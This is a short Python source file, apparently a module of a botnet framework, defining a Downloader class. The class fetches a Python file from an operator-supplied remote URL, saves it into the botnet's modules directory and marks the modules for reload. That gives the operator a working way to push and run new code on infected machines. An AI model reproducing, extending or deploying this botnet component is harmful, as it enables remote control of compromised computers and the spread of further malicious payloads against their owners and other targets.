from urllib import request
from threading import Thread

from botnet import logger
from botnet.modules.base_module import BaseModule

class Downloader(BaseModule):
    def __init__(self, params):
        self.module_name = params.pop(0)
        self.module_url = ":".join(params)
        
        super().__init__(params)

        self.finish_func_options = ["reload_modules"]

    def exec(self):
        request.urlretrieve(self.module_url, "botnet/modules/" + self.module_name + ".py")
        logger.success("Module " + self.module_name + " downloaded")
